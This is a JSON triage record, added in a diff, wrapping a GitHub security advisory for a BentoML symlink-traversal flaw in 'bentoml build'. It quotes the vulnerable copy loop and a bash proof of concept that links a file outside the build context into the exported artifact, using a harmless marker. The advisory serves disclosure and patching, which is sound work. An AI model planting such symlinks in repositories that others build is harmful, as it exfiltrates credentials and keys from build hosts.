@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/90000267?v=4\", \"events_url\": \"https://api.github.com/users/larlarua/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/larlarua/followers\", \"following_url\": \"https://api.github.com/users/larlarua/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/larlarua/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/larlarua\", \"id\": 90000267, \"login\": \"larlarua\", \"node_id\": \"MDQ6VXNlcjkwMDAwMjY3\", \"organizations_url\": \"https://api.github.com/users/larlarua/orgs\", \"received_events_url\": \"https://api.github.com/users/larlarua/received_events\", \"repos_url\": \"https://api.github.com/users/larlarua/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/larlarua/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/larlarua/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/larlarua\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-40610\", \"cvss\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"### Summary\\nBentoML's `bentoml build` packaging workflow follows attacker-controlled symlinks inside the build context and copies the referenced file contents into the generated Bento artifact.\\n\\nIf a victim builds an untrusted repository or other attacker-supplied build context, the attacker can place a symlink such as `loot.txt -> /tmp/outside-marker.txt` or a link to a more sensitive local file. When `bentoml build` runs, BentoML dereferences the symlink and packages the target file contents into the Bento. The leaked file can then propagate further through export, push, or containerization workflows.\\n\\n### Details\\nThe vulnerable code walks files under the build context and copies each matched entry into the Bento source directory:\\n\\n```python\\nfor root, _, files in os.walk(ctx_path):\\n    for f in files:\\n        dir_path = os.path.relpath(root, ctx_path)\\n        path = os.path.join(dir_path, f).replace(os.sep, \\\"/\\\")\\n        if specs.includes(path):\\n            src_file = ctx_path.joinpath(path)\\n            dst_file = target_fs.joinpath(dest_path)\\n            shutil.copy(src_file, dst_file)\\n```\\n\\nThere is no validation that the resolved path of `src_file` remains inside `ctx_path` before `shutil.copy` dereferences the source path. As a result, a repository-controlled symlink can cross the trust boundary from `attacker-controlled repository content` to `developer/CI host filesystem` during the build process.\\n\\nThis is a build-time path traversal / symlink traversal issue in the packaging feature, not a runtime API issue. The resulting Bento may later be exported, pushed to remote storage, or converted into a container image, which amplifies the leakage impact.\\n\\n### PoC\\nThe issue was verified in WSL against BentoML 1.4.38. The following script reproduces the vulnerability by using a harmless marker file outside the build directory.\\n\\n```bash\\nmkdir -p /tmp/bento-symlink-poc\\ncd /tmp/bento-symlink-poc\\n\\nprintf 'BENTOML_SYMLINK_POC_123456\\\\n' > /tmp/outside-marker.txt\\n\\ncat > service.py <<'EOF'\\nimport bentoml\\n\\n@bentoml.service\\nclass Demo:\\n    @bentoml.api\\n    def ping(self, x: str) -> str:\\n        return x\\nEOF\\n\\ncat > bentofile.yaml <<'EOF'\\nservice: \\\"service:Demo\\\"\\ninclude:\\n  - \\\"service.py\\\"\\n  - \\\"loot.txt\\\"\\nEOF\\n\\nln -s /tmp/outside-marker.txt loot.txt\\n\\nbentoml build --output tag\\nbentoml export demo:7pilrpjtlomelwct /tmp/poc.zip\\n\\nmkdir -p /tmp/poc-unzip\\nunzip -o /tmp/poc.zip -d /tmp/poc-unzip\\nfind /tmp/poc-unzip -name loot.txt -print\\ncat /tmp/poc-unzip/**/src/loot.txt 2>/dev/null || \\\\\\nfind /tmp/poc-unzip -path '*/src/loot.txt' -exec cat {} \\\\;\\n```\\n\\n- The script creates `/tmp/outside-marker.txt` outside the build context as a stand-in for a sensitive local file.\\n- It creates a minimal BentoML service and explicitly includes `loot.txt` in `bentofile.yaml`.\\n- It creates `loot.txt` as a symlink to the external marker file.\\n<img width=\\\"1531\\\" height=\\\"648\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/1312dcf0-74b0-4fb6-a05d-b68644470d82\\\" />\\n\\n- It runs `bentoml build`, exports the generated Bento, unzips it, and reads the packaged `src/loot.txt`.\\n- Successful exploitation is confirmed when the packaged file contains `BENTOML_SYMLINK_POC_123456`, proving that BentoML copied the external file contents rather than keeping only the symlink.\\n<img width=\\\"1315\\\" height=\\\"121\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/6ed34f51-9b68-4fa9-8a42-011deb84d54e\\\" />\\n\\n\\n<img width=\\\"1697\\\" height=\\\"760\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/9b8a8ae5-4f06-46b4-9e4a-dee25cc5d203\\\" />\\n\\n\\n### Impact\\nAn attacker who can cause a developer, release engineer, or CI system to run `bentoml build` on an attacker-controlled repository can exfiltrate local files from the build host into the Bento artifact.\\n\\nThis can expose secrets such as cloud credentials, SSH keys, API tokens, environment files, or other sensitive local configuration. Because Bento artifacts are commonly exported, uploaded, stored, or containerized after build, the leaked file contents can spread beyond the original build machine.\", \"epss\": {\"percentage\": 0.00284, \"percentile\": 0.1994}, \"ghsa_id\": \"GHSA-mcfx-4vc6-qgxv\", \"github_reviewed_at\": \"2026-05-07T16:39:47Z\", \"html_url\": \"https://github.com/advisories/GHSA-mcfx-4vc6-qgxv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-mcfx-4vc6-qgxv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-40610\"}], \"nvd_published_at\": \"2026-05-22T20:16:34Z\", \"published_at\": \"2026-05-07T16:39:47Z\", \"references\": [\"https://github.com/bentoml/BentoML/security/advisories/GHSA-mcfx-4vc6-qgxv\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-40610\", \"https://github.com/bentoml/BentoML/commit/5fb7cd41f92e2a56b45391284cf15b9ac9963a1f\", \"https://github.com/bentoml/BentoML/releases/tag/v1.4.39\", \"https://github.com/advisories/GHSA-mcfx-4vc6-qgxv\"], \"repository_advisory_url\": \"https://api.github.com/repos/bentoml/BentoML/security-advisories/GHSA-mcfx-4vc6-qgxv\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/bentoml/BentoML\", \"summary\": \"BentoML has Information Disclosure in `bentoml build` via symlink traversal in the build context\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:20:49Z\", \"url\": \"https://api.github.com/advisories/GHSA-mcfx-4vc6-qgxv\", \"vulnerabilities\": [{\"first_patched_version\": \"1.4.39\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"bentoml\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.4.38\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-mcfx-4vc6-qgxv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "bentoml: <= 1.4.38"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-40610"
+    ],
+    "cvss_score": 5.5,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "bentoml"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.217118Z",
+  "provenance": {
+    "content_sha256": "3562e57dd8ca547f31a7657f8ebed67d7ef96ece18ac2de4e61a3707b903bd58",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T16:39:47Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-mcfx-4vc6-qgxv",
+  "status": "active",
+  "title": "BentoML has Information Disclosure in `bentoml build` via symlink traversal in the build context",
+  "updated_at": "2026-06-08T23:20:49Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-mcfx-4vc6-qgxv"
+}
